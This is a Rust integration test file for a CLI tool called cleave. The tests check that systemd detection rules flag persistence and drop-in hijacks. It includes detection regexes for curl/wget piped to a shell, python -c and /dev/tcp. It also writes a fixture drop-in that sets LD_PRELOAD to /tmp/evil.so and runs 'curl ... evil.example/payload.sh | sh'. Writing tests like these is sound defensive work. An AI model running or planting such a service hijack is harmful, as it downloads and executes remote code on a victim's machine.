//! Integration tests for systemd KV rule evaluation through the CLI.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use serde_json::Value;
use std::fs;
use std::path::Path;
use tempfile::TempDir;

fn run_analyze_json(path: &Path, traits_dir: &Path) -> Value {
    let output = assert_cmd::cargo_bin_cmd!("cleave")
        .env("cleave_SKIP_YARA", "1")
        .env("CLEAVE_SKIP_CACHE", "1")
        .env_remove("CLEAVE_SKIP_TRAITS")
        .env_remove("cleave_SKIP_TRAITS")
        .env_remove("CLEAVE_TRAITS_DIR")
        .env_remove("cleave_TRAITS_DIR")
        .args([
            "--format",
            "json",
            "--traits-dir",
            traits_dir.to_str().unwrap(),
            "analyze",
            path.to_str().unwrap(),
        ])
        .output()
        .unwrap();

    assert!(
        output.status.success(),
        "cleave analyze failed.\nstderr:\n{}",
        String::from_utf8_lossy(&output.stderr)
    );

    serde_json::from_slice(&output.stdout).expect("valid JSON output")
}

fn get_first_file(json: &Value) -> &Value {
    json.get("fs")
        .and_then(Value::as_array)
        .and_then(|files| files.first())
        .or_else(|| {
            json.get("files")
                .and_then(Value::as_array)
                .and_then(|files| files.first())
        })
        .expect("analysis output should contain a file entry")
}

fn get_file_type(file: &Value) -> &str {
    file.get("file_type")
        .or_else(|| file.get("type"))
        .and_then(Value::as_str)
        .unwrap_or("")
}

fn get_findings(file: &Value) -> &[Value] {
    file.get("traits")
        .or_else(|| file.get("ts"))
        .and_then(Value::as_array)
        .map(Vec::as_slice)
        .expect("analysis output should contain findings")
}

fn finding_ids(file: &Value) -> Vec<String> {
    get_findings(file)
        .iter()
        .filter_map(|finding| {
            finding
                .get("id")
                .or_else(|| finding.get("i"))
                .and_then(Value::as_str)
                .map(ToOwned::to_owned)
        })
        .collect()
}

fn write_systemd_kv_traits(traits_dir: &Path) {
    fs::create_dir_all(traits_dir).unwrap();
    fs::write(
        traits_dir.join("systemd-kv.yaml"),
        r#"defaults:
  platforms: [linux, unix]
  for: [systemd]
  crit: notable
  conf: 0.8

traits:
  - id: systemd-kv/exec-start-python
    desc: ExecStart references python
    if:
      type: kv
      path: "service.exec_start"
      substr: "python3"

  - id: systemd-kv/restart-always
    desc: Restart always in service
    if:
      type: kv
      path: "service.restart"
      exact: "always"

  - id: systemd-kv/wanted-by-default
    desc: Default target install
    if:
      type: kv
      path: "install.wanted_by"
      exact: "default.target"

  - id: systemd-kv/exec-start-shell
    desc: ExecStart launches shell downloader
    crit: suspicious
    conf: 0.95
    if:
      type: kv
      path: "service.exec_start"
      regex: '(?i)(curl|wget).{0,80}(sh|bash)|python\s+-c|/dev/tcp/'

  - id: systemd-kv/ld-preload-env
    desc: LD_PRELOAD environment present
    crit: suspicious
    conf: 0.95
    if:
      type: kv
      path: "service.environment.LD_PRELOAD"
      exists: true

composite_rules:
  - id: systemd-kv/persistence
    desc: Systemd persistence via kv
    crit: suspicious
    conf: 0.95
    all:
      - id: systemd-kv/exec-start-python
      - id: systemd-kv/restart-always
      - id: systemd-kv/wanted-by-default

  - id: systemd-kv/dropin-hijack
    desc: Systemd drop-in hijack via kv
    crit: suspicious
    conf: 0.95
    all:
      - id: systemd-kv/exec-start-shell
      - id: systemd-kv/ld-preload-env
"#,
    )
    .unwrap();
}

#[test]
fn test_real_service_fixture_matches_systemd_kv_traits() {
    let temp_dir = TempDir::new().unwrap();
    let traits_dir = temp_dir.path().join("traits");
    write_systemd_kv_traits(&traits_dir);

    // Fixture lives in the sibling `cleave-traits` repo, which isn't a
    // hard dependency of the `cleave` crate. Skip gracefully when the
    // sibling checkout is absent so CI/contributors without it aren't
    // blocked — the synthetic-fixture test above still covers the
    // trait-matching logic.
    let fixture = Path::new(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../cleave-traits/testdata/canisterworm/pgmon.service"
    ));
    if !fixture.exists() {
        eprintln!(
            "skipping: fixture not present at {} (sibling cleave-traits checkout missing)",
            fixture.display()
        );
        return;
    }

    let json = run_analyze_json(fixture, &traits_dir);
    let file = get_first_file(&json);
    let ids = finding_ids(file);

    assert_eq!(get_file_type(file), "systemd");
    assert!(
        ids.contains(&"systemd-kv/exec-start-python".to_string()),
        "expected ExecStart KV trait to match, got {:?}",
        ids
    );
    assert!(
        ids.contains(&"systemd-kv/restart-always".to_string()),
        "expected Restart=always KV trait to match, got {:?}",
        ids
    );
    assert!(
        ids.contains(&"systemd-kv/wanted-by-default".to_string()),
        "expected WantedBy KV trait to match, got {:?}",
        ids
    );
    assert!(
        ids.contains(&"systemd-kv/persistence".to_string()),
        "expected composite KV persistence rule to match, got {:?}",
        ids
    );
}

#[test]
fn test_systemd_drop_in_matches_systemd_kv_traits() {
    let temp_dir = TempDir::new().unwrap();
    let traits_dir = temp_dir.path().join("traits");
    write_systemd_kv_traits(&traits_dir);

    let drop_in_dir = temp_dir.path().join("ssh.service.d");
    fs::create_dir_all(&drop_in_dir).unwrap();
    let drop_in = drop_in_dir.join("override.conf");
    fs::write(
        &drop_in,
        r#"[Service]
Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
ExecStart=
ExecStart=/bin/bash -c "curl -fsSL https://evil.example/payload.sh | sh"
"#,
    )
    .unwrap();

    let json = run_analyze_json(&drop_in, &traits_dir);
    let file = get_first_file(&json);
    let ids = finding_ids(file);

    assert_eq!(get_file_type(file), "systemd");
    assert!(
        ids.contains(&"systemd-kv/exec-start-shell".to_string()),
        "expected ExecStart shell trait to match, got {:?}",
        ids
    );
    assert!(
        ids.contains(&"systemd-kv/ld-preload-env".to_string()),
        "expected LD_PRELOAD trait to match, got {:?}",
        ids
    );
    assert!(
        ids.contains(&"systemd-kv/dropin-hijack".to_string()),
        "expected drop-in composite to match, got {:?}",
        ids
    );
}
